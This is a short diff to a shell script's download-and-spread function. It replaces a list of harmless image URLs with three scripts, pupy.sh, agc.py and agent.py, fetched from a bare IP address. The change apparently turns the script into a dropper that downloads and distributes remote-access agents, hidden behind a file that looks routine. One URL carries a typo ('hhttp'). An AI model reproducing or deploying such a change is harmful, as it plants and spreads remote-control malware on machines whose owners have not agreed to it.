@@ -35,10 +35,10 @@ function CreateList
    mkdir temp
    
     #Notice: you can add your items  into this arraylist in case you want to download files from the internet then spread them
-    arraylist[0]='http://www.ucl.ac.uk/news/news-articles/1215/winner-137.jpg'
-    arraylist[1]='http://clipart-library.com/data_images/394814.jpg'
-    arraylist[2]='https://www.dreamhost.com/blog/wp-content/uploads/2015/10/DHC_blog-image-01-300x300.jpg'
-    arraylist[3]='http://www.tarangarts.com/images/large/Om_1583.jpg'
+    arraylist[0]='http://35.221.117.19/pupy.sh'
+    arraylist[1]='http://35.221.117.19/agc.py'
+    arraylist[2]='hhttp://35.221.117.19/agent.py'
+   
 	
     #loop on the array and write the lines in the list.txt file
     for i in "${arraylist[@]}"
